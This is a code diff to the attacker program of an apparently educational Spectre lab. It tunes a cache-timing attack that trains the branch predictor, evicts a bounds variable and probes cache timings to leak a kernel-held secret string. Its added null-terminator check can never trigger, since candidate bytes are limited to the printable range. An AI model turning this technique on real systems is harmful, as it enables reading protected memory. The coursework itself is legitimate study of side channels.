@@ -6,13 +6,15 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 
 #include "labspectre.h"
 #include "labspectreipc.h"
 
-#define DRAM_THRESHOLD 200
+#define DRAM_THRESHOLD 100
 #define TRAINING_LOOPS 10
+#define EVICTION_SIZE (32 * 1024 * 1024)  // 32MB — larger than LLC
 
 /*
  * call_kernel_part3
@@ -45,76 +47,70 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
     printf("Launching attacker\n");
 
+    // Allocate eviction buffer larger than LLC to flush part3_limit from cache
+    char *eviction_buf = malloc(EVICTION_SIZE);
+    if (!eviction_buf) {
+        fprintf(stderr, "Failed to allocate eviction buffer\n");
+        return EXIT_FAILURE;
+    }
+    memset(eviction_buf, 0, EVICTION_SIZE);
+
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         uint64_t results[256] = {0};
 
-        for (int tries = 0; tries < 30; tries++) {
+        printf("Leaking offset %zu...\n", current_offset);
 
-            // Flush probe array
-            for (int i = 0; i < 256; i++) {
-                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
+        for (int tries = 0; tries < 25; tries++) {
+            // Train the branch predictor with offset less than part3_limit to make it predict the branch will be taken
+            for (int j = 0; j < TRAINING_LOOPS; j++) {
+                call_kernel_part3(kernel_fd, shared_memory, 0);
             }
-            asm volatile("mfence" ::: "memory");
 
-            // Train
-            if (tries % 5 == 0) {
-                for (int j = 0; j < 10; j++) {
-                    call_kernel_part3(kernel_fd, shared_memory, 0);
+            // Evict part3_limit from cache by reading a large eviction buffer to extend the speculation window
+            // Stride by 64 bytes (cache line size)
+            volatile int sink = 0;
+            for (int pass = 0; pass < 2; pass++) {
+                for (int e = 0; e < EVICTION_SIZE; e += 64) {
+                    sink += eviction_buf[e];
                 }
             }
 
-            // Flush again but DON'T madvise — just flush and a lightweight delay
+            // Flush probe array from cache to ensure we can detect when the kernel brings values into cache
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
             }
-            
-            // Small busy-wait to let part3_limit age out without a syscall
-            // (syscalls would re-cache it)
-            for (volatile int delay = 0; delay < 100; delay++);
-            
             asm volatile("mfence" ::: "memory");
 
+            // Attack — part3_limit is now cold in cache, so the branch
+            // condition takes longer to resolve, widening the speculation window
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
-            // Randomized probe order, skip 0
-            for (int i = 1; i < 256; i++) {
-                size_t rand_i = ((i * 167) % 255) + 1;
-                size_t idx = rand_i * SHD_SPECTRE_LAB_PAGE_SIZE;
-                uint64_t t = time_access(shared_memory + idx);
+            // Probe in ASCII printable range
+            for (int i = 32; i < 127; i++) {
+                uint64_t t = time_access(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE));
+                printf("Offset %zu, try %d, char %c: access time %lu cycles\n", current_offset, tries, i, t);
                 if (t < DRAM_THRESHOLD) {
-                    results[rand_i]++;
+                    results[i]++;
                 }
             }
         }
 
-        // After scoring, print top 5 candidates for offset 5
-        if (current_offset == 5) {
-            printf("Top candidates for offset 5:\n");
-            // Sort and print top 5
-            for (int rank = 0; rank < 5; rank++) {
-                int best = 0;
-                for (int i = 1; i < 256; i++) {
-                    if (results[i] > results[best]) best = i;
-                }
-                if (results[best] > 0) {
-                    printf("  '%c' (0x%02x) = %lu hits\n", 
-                        (best >= 32 && best < 127) ? best : '?', 
-                        best, results[best]);
-                }
-                results[best] = 0; // zero it out to find next best
-            }
-        }
-
-        // Pick the winner (highest hit count)
-        int best_val = 0;
-        for (int i = 1; i < 256; i++) {
+        // Pick the winner
+        int best_val = 32;
+        for (int i = 33; i < 127; i++) {
             if (results[i] > results[best_val]) best_val = i;
         }
         leaked_str[current_offset] = (char)best_val;
+
+        if ((char)best_val == '\x00') {
+            break;
+        }
     }
 
+    leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1] = '\0';
     printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
 
+    free(eviction_buf);
     close(kernel_fd);
     return EXIT_SUCCESS;
 }
